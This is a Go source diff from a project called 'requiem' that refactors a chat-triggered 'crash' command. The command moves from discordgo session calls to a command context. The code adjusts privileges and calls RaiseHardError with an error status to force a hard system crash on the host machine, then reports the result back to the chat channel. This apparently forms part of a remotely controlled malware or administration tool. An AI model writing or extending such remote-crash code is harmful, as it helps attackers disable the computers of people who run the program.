@@ -4,13 +4,11 @@ import (
 	"unsafe"
 
 	"requiem/store"
-
-	"github.com/bwmarrin/discordgo"
 )
 
-func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*CrashCommand) Exec(ctx *store.CommandContext, args []string) {
 	if store.DEBUG_MODE && store.DEBUG_MODE_BLOCK_DANGEROUS_FUNCS {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You cannot do this in debug mode.", msg.Reference())
+		ctx.ReplyMsg("🟥 You cannot do this in debug mode.")
 		return
 	}
 
@@ -25,10 +23,10 @@ func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	)
 
 	if ret != 0 {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to adjust privileges.", msg.Reference())
+		ctx.ReplyMsg("🟥 Failed to adjust privileges.")
 	}
 
-	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully triggered crash.", msg.Reference())
+	initial, _ := ctx.ReplyMsg("🟩 Successfully triggered crash.")
 
 	ret, _, _ = store.RaiseHardError.Call(
 		uintptr(0xC000007B),
@@ -40,13 +38,13 @@ func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	)
 
 	if ret != 0 {
-		ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to trigger crash.", msg.Reference())
+		ctx.DeleteMsg(initial.ID)
+		ctx.ReplyMsg("🟥 Failed to trigger crash.")
 		return
 	}
 
-	ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
-	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to crash.", msg.Reference())
+	ctx.DeleteMsg(initial.ID)
+	ctx.ReplyMsg("🟥 Failed to crash.")
 }
 
 func (*CrashCommand) Name() string {
